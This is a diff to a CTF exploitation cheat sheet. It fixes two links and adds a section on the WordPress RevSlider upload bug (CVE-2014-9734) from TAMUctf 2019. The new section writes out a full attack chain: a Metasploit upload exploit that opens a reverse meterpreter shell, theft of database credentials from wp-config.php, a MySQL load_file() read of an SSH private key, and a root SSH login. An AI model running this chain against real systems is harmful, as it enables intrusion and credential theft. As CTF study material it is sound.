@@ -25,6 +25,7 @@ Specific CVEs and vulnerability patterns. For Node.js CVEs (flatnest, Happy-DOM)
 - [CVE-2023-27350: PaperCut NG Authentication Bypass + RCE (Bamboo HTB)](#cve-2023-27350-papercut-ng-authentication-bypass--rce-bamboo-htb)
 - [CVE-2024-22120: Zabbix Time-Based Blind SQLi (Watcher HTB)](#cve-2024-22120-zabbix-time-based-blind-sqli-watcher-htb)
 - [CVE-2012-0053: Apache HttpOnly Cookie Leak via 400 Bad Request (RC3 CTF 2016)](#cve-2012-0053-apache-httponly-cookie-leak-via-400-bad-request-rc3-ctf-2016)
+- [CVE-2014-9734: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)](#cve-2014-9734-wordpress-revslider-upload--mysql-load_file-ssh-pivot-tamuctf-2019)
 - [Detection Checklist](#detection-checklist)
 
 ---
@@ -173,7 +174,7 @@ See [server-side.md](server-side.md) for full details.
 
 **Affected:** ExifTool ≤ 12.23. DjVu ANTa annotation chunk parsed with Perl `eval`. Craft minimal DjVu with injected metadata to achieve RCE on any endpoint processing images with ExifTool.
 
-See [server-side-advanced.md](server-side-advanced.md#exiftool-cve-2021-22204-djvu-perl-injection-0xfun-2026) for full exploit code.
+See [server-side-advanced.md](server-side-advanced.md#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026) for full exploit code.
 
 ---
 
@@ -230,7 +231,7 @@ pdfdetach -save 1 -o flag.txt output.pdf  # Extract
 
 **Affected:** React Server Components / Next.js (Flight protocol deserialization). A crafted fake Flight chunk exploits the constructor chain (`constructor → constructor → Function`) for arbitrary server-side JavaScript execution. Identify via `Next-Action` + `Accept: text/x-component` headers. Also reported as CVE-2025-66478 with an alternate prototype chain variant (`__proto__:then` instead of `constructor:constructor`).
 
-See [server-side-advanced.md](server-side-advanced.md#react-server-components-flight-protocol-rce-ehax-2026) for full exploit chain.
+See [server-side-advanced-4.md](server-side-advanced-4.md#react-server-components-flight-protocol-rce-ehax-2026) for full exploit chain.
 
 ---
 
@@ -318,6 +319,37 @@ xhr.send();
 ```
 
 **Key insight:** Apache 2.2.x before 2.2.22 included the full Cookie header in 400 Bad Request HTML responses, including HttpOnly cookies. Combined with XSS on the same origin, this defeats HttpOnly protection entirely. Check server version headers for vulnerable Apache instances.
+
+---
+
+## CVE-2014-9734: WordPress RevSlider Upload + MySQL load_file() SSH Pivot (TAMUctf 2019)
+
+**Affected:** WordPress Slider Revolution (RevSlider) plugin `<= 3.0.95` — arbitrary file upload via `update_plugin` admin-ajax action, exploitable unauthenticated.
+
+**Version fingerprint:** Fetch `/wp-content/plugins/revslider/release_log.txt` — the plugin writes its version there even when the admin UI is locked down.
+
+```bash
+# 1. RCE via RevSlider upload (Metasploit module)
+msfconsole -q -x "use exploit/unix/webapp/wp_revslider_upload_execute; \
+  set RHOSTS 172.30.0.3; set LHOST tun0; exploit"
+
+# 2. From the meterpreter shell, steal DB creds from wp-config.php
+cat /var/www/wp-config.php | grep -E "DB_(NAME|USER|PASSWORD|HOST)"
+# -> DB_USER='wordpress', DB_PASSWORD='0NYa6PBH52y86C', DB_HOST='172.30.0.2'
+
+# 3. Pivot: connect as the DB user and read any world-readable file with load_file()
+mysql -h 172.30.0.2 -u wordpress --password='0NYa6PBH52y86C' \
+      -e "SELECT load_file('/backup/id_rsa')"
+#   (requires FILE privilege, granted to the WP user on older default stacks)
+
+# 4. Use the exfiltrated key to SSH into the target as root
+chmod 400 rsa.key
+ssh -i rsa.key root@172.30.0.3
+```
+
+**Key insight:** RCE via plugin upload is rarely the end — extract `wp-config.php` DB creds, connect to the database, and `load_file()` to read any world-readable file (private SSH keys under `/backup/`, `/root/.ssh/`, `/home/*/.ssh/`, CI secrets, etc.), then SSH pivot to the real target box. The WP user almost always has FILE privilege on CTF setups. Exploits to chain with a single file-upload: `wp_revslider_upload_execute`, `wp_admin_shell_upload`, `wp_asset_manager_upload_exec`, `wp_symposium_shell_upload`.
+
+**References:** TAMUctf 2019 — Wordpress, writeup 13593. Rapid7 module `exploit/unix/webapp/wp_revslider_upload_execute`.
 
 ---
 
